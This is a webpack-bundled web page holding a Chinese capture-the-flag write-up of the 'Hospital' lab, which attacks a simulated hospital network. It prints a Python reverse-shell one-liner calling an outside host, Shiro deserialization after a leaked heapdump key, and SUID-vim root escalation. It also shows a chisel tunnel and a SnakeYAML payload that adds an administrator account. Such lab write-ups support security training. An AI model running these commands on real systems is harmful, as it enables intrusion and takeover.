"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[29095],{37225:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>c,contentTitle:()=>o,default:()=>d,frontMatter:()=>r,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"Yunjing/major/Hospital/index","title":"Hospital","description":"\u5728\u8fd9\u4e2a\u573a\u666f\u4e2d\uff0c\u4f60\u5c06\u626e\u6f14\u4e00\u540d\u6e17\u900f\u6d4b\u8bd5\u5de5\u7a0b\u5e08\uff0c\u88ab\u6d3e\u9063\u53bb\u6d4b\u8bd5\u67d0\u5bb6\u533b\u9662\u7684\u7f51\u7edc\u5b89\u5168\u6027\u3002\u4f60\u7684\u76ee\u6807\u662f\u6210\u529f\u83b7\u53d6\u6240\u6709\u670d\u52a1\u5668\u7684\u6743\u9650\uff0c\u4ee5\u8bc4\u4f30\u516c\u53f8\u7684\u7f51\u7edc\u5b89\u5168\u72b6\u51b5\u3002\u8be5\u9776\u573a\u5171\u6709 4 \u4e2a flag\uff0c\u5206\u5e03\u4e8e\u4e0d\u540c\u7684\u9776\u673a\u3002","source":"@site/docs/Yunjing/major/Hospital/index.md","sourceDirName":"Yunjing/major/Hospital","slug":"/Yunjing/major/Hospital/","permalink":"/Target-Machines-WriteUp/docs/Yunjing/major/Hospital/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Yunjing/major/Hospital/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Yunjing_Sidebar","previous":{"title":"Delegation","permalink":"/Target-Machines-WriteUp/docs/Yunjing/major/Delegation/"},"next":{"title":"Initial","permalink":"/Target-Machines-WriteUp/docs/Yunjing/major/Initial/"}}');var a=t(74848),i=t(28453);const r={},o="Hospital",c={},l=[{value:"\u5165\u53e3\u70b9\u63a2\u6d4b",id:"\u5165\u53e3\u70b9\u63a2\u6d4b",level:2},{value:"\u5165\u53e3\u70b9 shiro \u53cd\u5e8f\u5217\u5316",id:"\u5165\u53e3\u70b9-shiro-\u53cd\u5e8f\u5217\u5316",level:2},{value:"\u5165\u53e3\u70b9 \u63d0\u6743",id:"\u5165\u53e3\u70b9-\u63d0\u6743",level:2},{value:"\u5185\u7f51\u63a2\u6d4b",id:"\u5185\u7f51\u63a2\u6d4b",level:2},{value:"172.30.12.6 Nacos",id:"17230126-nacos",level:2}];function p(n){const e={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...n.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(e.header,{children:(0,a.jsx)(e.h1,{id:"hospital",children:"Hospital"})}),"\n",(0,a.jsx)(e.p,{children:"\u5728\u8fd9\u4e2a\u573a\u666f\u4e2d\uff0c\u4f60\u5c06\u626e\u6f14\u4e00\u540d\u6e17\u900f\u6d4b\u8bd5\u5de5\u7a0b\u5e08\uff0c\u88ab\u6d3e\u9063\u53bb\u6d4b\u8bd5\u67d0\u5bb6\u533b\u9662\u7684\u7f51\u7edc\u5b89\u5168\u6027\u3002\u4f60\u7684\u76ee\u6807\u662f\u6210\u529f\u83b7\u53d6\u6240\u6709\u670d\u52a1\u5668\u7684\u6743\u9650\uff0c\u4ee5\u8bc4\u4f30\u516c\u53f8\u7684\u7f51\u7edc\u5b89\u5168\u72b6\u51b5\u3002\u8be5\u9776\u573a\u5171\u6709 4 \u4e2a flag\uff0c\u5206\u5e03\u4e8e\u4e0d\u540c\u7684\u9776\u673a\u3002"}),"\n",(0,a.jsxs)(e.admonition,{type:"info",children:[(0,a.jsx)(e.p,{children:"Tags"}),(0,a.jsxs)(e.ul,{children:["\n",(0,a.jsx)(e.li,{children:"\u5185\u7f51\u6e17\u900f"}),"\n",(0,a.jsx)(e.li,{children:"Nacos"}),"\n",(0,a.jsx)(e.li,{children:"Shiro"}),"\n",(0,a.jsx)(e.li,{children:"Fastjson"}),"\n",(0,a.jsx)(e.li,{children:"Decrypt"}),"\n"]})]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-plaintext",metastring:'title="\u5165\u53e3\u70b9"',children:"39.98.116.141\n"})}),"\n",(0,a.jsx)(e.h2,{id:"\u5165\u53e3\u70b9\u63a2\u6d4b",children:"\u5165\u53e3\u70b9\u63a2\u6d4b"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-plaintext",children:"start infoscan\n39.98.116.141:22 open\n39.98.116.141:8080 open\n[*] alive ports len is: 2\nstart vulscan\n[*] WebTitle http://39.98.116.141:8080 code:302 len:0      title:None \u8df3\u8f6c url: http://39.98.116.141:8080/login;jsessionid=F56DD760EA13EF7948D3B0BE8D1372C4\n[*] WebTitle http://39.98.116.141:8080/login;jsessionid=F56DD760EA13EF7948D3B0BE8D1372C4 code:200 len:2005   title: \u533b\u7597\u7ba1\u7406\u540e\u53f0\n[+] PocScan http://39.98.116.141:8080 poc-yaml-spring-actuator-heapdump-file\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u626b\u4e00\u4e0b\u76ee\u5f55"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-plaintext",children:"[21:53:39] 200 -    1KB - /actuator\n[21:53:39] 200 -   20B  - /actuator/;/caches\n[21:53:39] 200 -   15B  - /actuator/;/health\n[21:53:40] 200 -   93KB - /actuator/;/conditions\n[21:53:40] 200 -   74KB - /actuator/;/beans\n[21:53:40] 200 -    2B  - /actuator/;/info\n[21:53:40] 200 -    8KB - /actuator/;/configprops\n[21:53:40] 200 -  749B  - /actuator/;/metrics\n[21:53:40] 200 -   20KB - /actuator/;/mappings\n[21:53:40] 200 -   54B  - /actuator/;/scheduledtasks\n[21:53:40] 200 -   53KB - /actuator/;/loggers\n[21:53:40] 200 -   20B  - /actuator/caches\n[21:53:40] 200 -    8KB - /actuator/configprops\n[21:53:40] 200 -   15B  - /actuator/health\n[21:53:41] 200 -    2B  - /actuator/info\n[21:53:41] 200 -  749B  - /actuator/metrics\n[21:53:41] 200 -   20KB - /actuator/mappings\n[21:53:41] 200 -   54B  - /actuator/scheduledtasks\n[21:53:41] 200 -   93KB - /actuator/conditions\n[21:53:41] 200 -   74KB - /actuator/beans\n[21:53:41] 200 -  127KB - /actuator/;/threaddump\n[21:53:41] 200 -   53KB - /actuator/loggers\n[21:53:41] 200 -  126KB - /actuator/threaddump\n[21:53:44] 200 -  118MB - /actuator/;/heapdump\n[21:53:46] 200 -   34MB - /actuator/heapdump\n[21:54:29] 200 -    2KB - /login\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u53d1\u73b0\u5b58\u5728 heapdump \u6cc4\u9732\uff0c\u4f7f\u7528 ",(0,a.jsx)(e.a,{href:"https://github.com/whwlsfb/JDumpSpider",children:"whwlsfb/JDumpSpider: HeapDump \u654f\u611f\u4fe1\u606f\u63d0\u53d6\u5de5\u5177"})," \u8fdb\u884c\u5206\u6790"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ java -jar ~/tools/JDumpSpider-1.1-SNAPSHOT-full.jar ~/tmp/heapdump\n===========================================\nCookieRememberMeManager(ShiroKey)\n-------------\nalgMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u90a3\u5c31\u5f88\u660e\u663e\u4e86\uff0c\u6253 shiro \u53cd\u5e8f\u5217\u5316"}),"\n",(0,a.jsx)(e.h2,{id:"\u5165\u53e3\u70b9-shiro-\u53cd\u5e8f\u5217\u5316",children:"\u5165\u53e3\u70b9 shiro \u53cd\u5e8f\u5217\u5316"}),"\n",(0,a.jsx)(e.p,{children:"\u76f4\u63a5\u5229\u7528\u5de5\u5177"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{alt:"img",src:t(43408).A+"",width:"1504",height:"1247"})}),"\n",(0,a.jsx)(e.p,{children:"\u5229\u7528 CommonsBeanutils1 \u94fe\u5b50\u8fdb\u884c\u653b\u51fb\uff0c\u76f4\u63a5\u5229\u7528\u73af\u5883\u5df2\u6709\u7684 pytohn3 \u53cd\u5f39 shell"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.***.***.180",9111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'\n'})}),"\n",(0,a.jsx)(e.p,{children:"\u6210\u529f\u6536\u5230\u56de\u8fde"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"(remote) app@web01:/home/app$ whoami\napp\n"})}),"\n",(0,a.jsx)(e.h2,{id:"\u5165\u53e3\u70b9-\u63d0\u6743",children:"\u5165\u53e3\u70b9 \u63d0\u6743"}),"\n",(0,a.jsx)(e.p,{children:"\u57fa\u4e8e PEASS-ng \u8fdb\u884c\u63a2\u6d4b"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-plaintext",children:"# 1\nVulnerable to CVE-2021-3560\n\n# 2 suid\n/usr/bin/vim.basic\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/staprun\n/usr/bin/at\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/stapbpf\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/fusermount\n/usr/bin/mount\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n"})}),"\n",(0,a.jsxs)(e.p,{children:["\u5176\u4e2d ",(0,a.jsx)(e.code,{children:"/usr/bin/vim.basic"})," \u5c31\u662f vim \u7a0b\u5e8f\uff0c\u53ef\u4ee5\u76f4\u63a5\u63d0\u6743"]}),"\n",(0,a.jsxs)(e.p,{children:["\u53c2\u8003 ",(0,a.jsx)(e.a,{href:"https://gtfobins.github.io/gtfobins/vim/",children:"vim | GTFOBins"})]}),"\n",(0,a.jsx)(e.p,{children:"\u6700\u7ec8\u6210\u529f\u5f97\u5230root\u6743\u9650"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:'(remote) app@web01:/tmp$ /usr/bin/vim.basic -c \':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'\n(remote) root@web01:/tmp$ whoami\nroot\n(remote) root@web01:/tmp$ whoami\nroot\n(remote) root@web01:/tmp$ cat /root/flag/flag01.txt\nsh: 5: catt/flag/flag01.txt: not found\n(remote) root@web01:/tmp$ cat /root/flag/flag01.txt\nO))     O))                              O))             O))\nO))     O))                          O)  O))             O))\nO))     O))   O))     O)))) O) O))     O)O) O)   O))     O))\nO)))))) O)) O))  O)) O))    O)  O)) O))  O))   O))  O))  O))\nO))     O))O))    O))  O))) O)   O))O))  O))  O))   O))  O))\nO))     O)) O))  O))     O))O)) O)) O))  O))  O))   O))  O))\nO))     O))   O))    O)) O))O))     O))   O))   O)) O)))O)))\n                            O))                             \nflag01: flag{a5d80f8e-3aca-46f0-b686-2120183080b0}\n'})}),"\n",(0,a.jsx)(e.h2,{id:"\u5185\u7f51\u63a2\u6d4b",children:"\u5185\u7f51\u63a2\u6d4b"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-plaintext",children:"(remote) app@web01:/tmp$ ifconfig \neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 172.30.12.5  netmask 255.255.0.0  broadcast 172.30.255.255\n        inet6 fe80::216:3eff:fe31:aa0  prefixlen 64  scopeid 0x20<link>\n        ether 00:16:3e:31:0a:a0  txqueuelen 1000  (Ethernet)\n        RX packets 134410  bytes 149624849 (149.6 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 64379  bytes 54100576 (54.1 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 1356  bytes 117711 (117.7 KB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 1356  bytes 117711 (117.7 KB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u4f7f\u7528fscan\u8fdb\u884c\u626b\u63cf"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"start infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 172.30.12.6     is alive\n(icmp) Target 172.30.12.5     is alive\n(icmp) Target 172.30.12.236   is alive\n[*] Icmp alive hosts len is: 3\n172.30.12.6:139 open\n172.30.12.6:135 open\n172.30.12.236:22 open\n172.30.12.5:22 open\n172.30.12.6:8848 open\n172.30.12.236:8080 open\n172.30.12.5:8080 open\n172.30.12.6:445 open\n172.30.12.236:8009 open\n[*] alive ports len is: 9\nstart vulscan\n[*] WebTitle http://172.30.12.5:8080   code:302 len:0      title:None \u8df3\u8f6curl: http://172.30.12.5:8080/login;jsessionid=00236AC1CDAD331B40996039D6B45AE9\n[*] NetInfo \n[*]172.30.12.6\n   [->]Server02\n   [->]172.30.12.6\n[*] NetBios 172.30.12.6     WORKGROUP\\SERVER02            \n[*] WebTitle http://172.30.12.5:8080/login;jsessionid=00236AC1CDAD331B40996039D6B45AE9 code:200 len:2005   title:\u533b\u7597\u7ba1\u7406\u540e\u53f0\n[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:\u533b\u9662\u540e\u53f0\u7ba1\u7406\u5e73\u53f0\n[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 \u2013 Not Found\n[+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file \n[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos \n[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass \n"})}),"\n",(0,a.jsx)(e.p,{children:"\u5efa\u7acb\u5185\u7f51\u4ee3\u7406"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"# vps\nroot@jmt-projekt:~# ./tools/chisel_1.10.1/chisel_1.10.1_linux_amd64 server -p 9111 --reverse\n2025/01/31 22:29:55 server: Reverse tunnelling enabled\n2025/01/31 22:29:55 server: Fingerprint aJ0gszNkS6fbIPXignmil8GEMz9HIqldsgbf2UnVmMA=\n2025/01/31 22:29:55 server: Listening on http://0.0.0.0:9111\n\n# target\n(remote) app@web01:/tmp$ ./chisel_1.10.1_linux_amd64 client 8.***.***.180:9111 R:0.0.0.0:10000:socks &\n[1] 19534\n2025/01/31 22:30:40 client: Connecting to ws://8.***.***.180:9111\n2025/01/31 22:30:40 client: Connected (Latency 51.577505ms)\n"})}),"\n",(0,a.jsx)(e.h2,{id:"17230126-nacos",children:"172.30.12.6 Nacos"}),"\n",(0,a.jsxs)(e.p,{children:["\u76f4\u63a5\u4f7f\u7528",(0,a.jsx)(e.a,{href:"https://github.com/charonlight/NacosExploitGUI",children:"charonlight/NacosExploitGUI: Nacos\u6f0f\u6d1e\u7efc\u5408\u5229\u7528GUI\u5de5\u5177"}),"\u8fdb\u884c\u5229\u7528"]}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{alt:"img",src:t(98400).A+"",width:"1924",height:"1247"})}),"\n",(0,a.jsxs)(e.p,{children:["\u5c1d\u8bd5\u8fdb\u884cyaml\u53cd\u5e8f\u5217\u5316\uff0c\u4f7f\u7528",(0,a.jsx)(e.a,{href:"https://github.com/artsploit/yaml-payload",children:"artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads"})]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-java",children:'Runtime.getRuntime().exec("net user randark randark 123 /add");\nRuntime.getRuntime().exec("net localgroup Administrators randark /add");\n'})}),"\n",(0,a.jsx)(e.p,{children:"\u7f16\u8bd1jar\u5305"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"PS D:\\_Exps\\yaml-payload> javac src/artsploit/AwesomeScriptEngineFactory.java\nPS D:\\_Exps\\yaml-payload> jar -cvf exp.jar -C src/ .         \n\u5df2\u6dfb\u52a0\u6e05\u5355\n\u6b63\u5728\u6dfb\u52a0: artsploit/(\u8f93\u5165 = 0) (\u8f93\u51fa = 0)(\u5b58\u50a8\u4e86 0%)\n\u6b63\u5728\u6dfb\u52a0: artsploit/AwesomeScriptEngineFactory.class(\u8f93\u5165 = 1686) (\u8f93\u51fa = 711)(\u538b\u7f29\u4e86 57%)\n\u6b63\u5728\u6dfb\u52a0: artsploit/AwesomeScriptEngineFactory.java(\u8f93\u5165 = 1655) (\u8f93\u51fa = 424)(\u538b\u7f29\u4e86 74%)\n\u6b63\u5728\u5ffd\u7565\u6761\u76eeMETA-INF/\n\u6b63\u5728\u6dfb\u52a0: META-INF/services/(\u8f93\u5165 = 0) (\u8f93\u51fa = 0)(\u5b58\u50a8\u4e86 0%)\n\u6b63\u5728\u6dfb\u52a0: META-INF/services/javax.script.ScriptEngineFactory(\u8f93\u5165 = 36) (\u8f93\u51fa = 38)(\u538b\u7f29\u4e86 -5%)\n"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{alt:"img",src:t(48431).A+"",width:"1924",height:"1247"})})]})}function d(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,a.jsx)(e,{...n,children:(0,a.jsx)(p,{...n})}):p(n)}},43408:(n,e,t)=>{t.d(e,{A:()=>s});const s=t.p+"assets/images/image_20250100-220021-d481f1331334dfa822cb2ca94601764e.png"},98400:(n,e,t)=>{t.d(e,{A:()=>s});const s=t.p+"assets/images/image_20250135-223518-4f0f3d1ba61aea9c19e55db9ccd49639.png"},48431:(n,e,t)=>{t.d(e,{A:()=>s});const s=t.p+"assets/images/image_20250150-225046-29d501f56a7463db8d54b37c8502893f.png"},28453:(n,e,t)=>{t.d(e,{R:()=>r,x:()=>o});var s=t(96540);const a={},i=s.createContext(a);function r(n){const e=s.useContext(i);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(a):n.components||a:r(n.components),s.createElement(i.Provider,{value:e},n.children)}}}]);